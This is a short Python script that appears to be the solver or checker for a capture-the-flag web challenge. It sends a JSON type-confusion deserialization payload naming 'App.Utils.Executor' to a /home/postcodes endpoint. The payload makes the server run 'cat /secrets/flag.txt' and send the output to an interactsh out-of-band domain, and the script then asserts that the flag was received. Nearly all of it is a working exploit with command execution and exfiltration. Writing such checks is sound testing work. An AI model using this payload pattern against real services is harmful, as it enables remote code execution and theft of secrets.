import requests
import argparse
import pickle
import yaml
import logging
import re
import subprocess
import select
import json
from time import time
from pathlib import Path
from base64 import b64encode

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / 'meta.yml'))['flags']
OAST = re.compile(r'\[.*INF.*\] ([a-z0-9]+\.[a-z0-9]+\.[a-z]+)')

logger = logging.getLogger('secretary')

def test(url):
    p = subprocess.Popen(['interactsh-client', '-json'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

    while True:
        line = p.stderr.readline()
        if m := OAST.match(line):
            domain = m.group(1)
            logger.debug('OAST domain: %s', domain)
            break

    res = requests.post(f'{url}/home/postcodes', json={"$type":"App.Utils.Executor, App",
                            "cmd":"cat",
                            "args": "/secrets/flag.txt",
                            "resultUrl": f"http://{domain}"
	})

    logger.info(res.text)

    start = time()
    flag_request = None
    poll_obj = select.poll()
    poll_obj.register(p.stdout, select.POLLIN)
    while(time() - start < 180):
        poll_result = poll_obj.poll(0)
        if poll_result:
            line = p.stdout.readline()
            logger.debug(line)
            data = json.loads(line)
            if data['protocol'] != 'http':
                continue
            else:
                flag_request = data['raw-request']
                break

    assert flag_request, 'Flag not received OOB'

    assert FLAG in flag_request, flag_request

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', default='http://localhost:5000', nargs='?')
    args = parser.parse_args()

    test(args.url)
